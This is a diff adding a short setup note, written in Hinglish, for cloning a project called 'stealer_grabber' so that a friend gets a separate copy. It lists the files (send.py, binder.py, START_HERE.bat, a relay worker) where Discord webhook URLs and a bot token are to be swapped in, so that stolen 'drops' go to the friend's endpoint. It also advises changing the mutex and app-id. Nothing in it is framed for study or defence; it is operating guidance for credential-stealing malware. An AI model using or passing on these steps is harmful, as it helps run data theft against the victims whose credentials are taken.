@@ -1,0 +1,15 @@
+CLONE SETUP - friend ka alag receiver/endpoint
+
+1) Friend ka apna Discord webhook banao (Server Settings -> Integrations -> Webhooks).
+2) Is clone me ye 3 jagah webhook replace karo:
+   - send.py          : WEBHOOK = "https://discord.com/api/webhooks/ID/TOKEN"
+   - binder.py        : DEFAULT_WEBHOOK = ("https://discord.com/api/webhooks/" + "ID/TOKEN")
+   - START_HERE.bat   : set HOOK=https://discord.com/api/webhooks/ID/TOKEN
+   - relay/worker.js  : const HOOK = "https://discord.com/api/webhooks/ID/TOKEN"  (agar relay use kar rahe ho)
+3) discord_read.json me friend ka bot_token daalo (optional, live sender list ke liye).
+4) Ab friend ke drops sirf friend ke webhook pe jayenge, tumhare webhook pe nahi.
+
+NOTE: Original (stealer_grabber) aur clone (stealer_grabber_friend) ka data kabhi mix nahi hoga
+kyunki dono ka endpoint alag hai. Mutex/APP_ID alag rakhne ke liye app-id bhi badal sakte ho.
+
+Placeholder currently: https://discord.com/api/webhooks/FRIEND_WEBHOOK_ID/FRIEND_WEBHOOK_TOKEN
